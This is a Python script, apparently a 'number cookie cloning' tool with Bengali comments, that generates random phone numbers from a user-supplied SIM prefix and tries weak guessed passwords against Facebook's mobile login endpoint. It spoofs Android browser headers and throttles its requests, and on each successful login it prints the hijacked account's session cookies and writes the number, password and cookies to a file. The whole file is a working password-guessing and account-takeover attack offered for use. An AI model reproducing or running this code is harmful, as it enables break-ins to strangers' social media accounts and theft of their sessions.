import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color Codes
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'; B = '\033[1;34m'; P = '\033[1;35m'
loop = 0; ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] DEVELOPED BY : MD MALEK ISLAM            |
| [✓] STATUS       : REAL COOKIE (SLOW MODE)   |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] NUMBER COOKIE CLONING')
    print(f'[0] EXIT')
    choose = input(f'{Y}[▼] CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE (Ex: 017): {W}')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    
    banner()
    print(f'{G}[+] SAFE PROCESS STARTED... (SLOW SPEED)')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    # আপনার কথা মতো একদম স্লো স্পিড (৫ জন কর্মী)
    with ThreadPool(max_workers=5) as pool:
        for _ in range(limit):
            if len(code) == 3:
                num = str(random.randint(11111111, 99999999))
            else:
                num = str(random.randint(1111111, 9999999))
            
            uid = code + num
            # পাসওয়ার্ড সিস্টেম: নাম্বারের শেষ ৬ সংখ্যা
            pws = [uid[-6:], uid] 
            pool.submit(login_api, uid, pws, limit)

def login_api(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        ua = f"Mozilla/5.0 (Linux; Android {random.randint(9,13)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,122)}.0.0.0 Mobile Safari/537.36"
        
        headers = {
            'authority': 'm.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://m.facebook.com',
            'referer': 'https://m.facebook.com/login/',
            'user-agent': ua,
        }
        
        url = "https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        data = {"lsd": "AVpY", "jazoest": "2931", "email": uid, "pass": pas}

        try:
            # আপনি যা চেয়েছেন: প্রতি রিকোয়েস্টে ১ সেকেন্ড বিরতি
            time.sleep(1.0) 
            response = session.post(url, data=data, headers=headers, timeout=30)
            
            if "c_user" in session.cookies.get_dict():
                kuki = (";").join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas}') 
                print(f'{G}[🌺] COOKIE = {kuki}\n')
                ok.append(uid)
                with open('ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{kuki}\n')
                break
        except:
            pass
            
    loop += 1

if __name__ == "__main__":
    main()
